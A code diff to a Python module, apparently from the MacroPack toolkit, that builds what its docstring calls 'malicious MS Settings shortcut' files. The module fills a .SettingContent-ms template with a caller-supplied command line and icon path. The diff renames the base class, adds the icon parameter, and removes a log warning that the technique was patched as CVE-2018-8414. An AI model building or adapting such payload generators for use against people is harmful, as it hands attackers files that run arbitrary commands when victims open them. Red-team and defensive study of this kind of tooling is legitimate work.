@@ -2,7 +2,7 @@
 # encoding: utf-8
 
 import logging
-from modules.payload_builder import PayloadBuilder
+from modules.mp_generator import Generator
 from collections import OrderedDict
 
 """
@@ -35,7 +35,7 @@ r"""<?xml version="1.0" encoding="UTF-8"?>
 """
 
 
-class SettingsShortcutGenerator(PayloadBuilder):
+class SettingsShortcutGenerator(Generator):
     """ Module used to generate malicious MS Settings shortcut"""
     
     def check(self):
@@ -45,13 +45,13 @@ class SettingsShortcutGenerator(PayloadBuilder):
     def generate(self):
                 
         logging.info(" [+] Generating %s file..." % self.outputFileType)        
-        paramDict = OrderedDict([("Cmd_Line",None)])      
+        paramDict = OrderedDict([("Cmd_Line",None),("Icon_Path",None)])      
         self.fillInputParams(paramDict)
         
         # Fill template
         content = SETTINGS_MS_TEMPLATE
         content = content.replace("<<<CMD>>>", paramDict["Cmd_Line"])
-        content = content.replace("<<<ICON>>>", self.mpSession.icon)
+        content = content.replace("<<<ICON>>>", paramDict["Icon_Path"])
              
         # Write in new SCF file
         f = open(self.outputFilePath, 'w')
@@ -59,8 +59,7 @@ class SettingsShortcutGenerator(PayloadBuilder):
         f.close()
         
         logging.info("   [-] Generated Settings Shortcut file: %s" % self.outputFilePath)
-        logging.info("   [-] Test with: Double click on %s file." % self.outputFilePath)
-        logging.info("   [!] The attack via SettingContent-ms has been patched as CVE-2018-8414. \n       This payload is kept in MacroPack but its useless in offensive security scenario.\n")
+        logging.info("   [-] Test with : \n Click on %s file to test.\n" % self.outputFilePath)
         
 
         
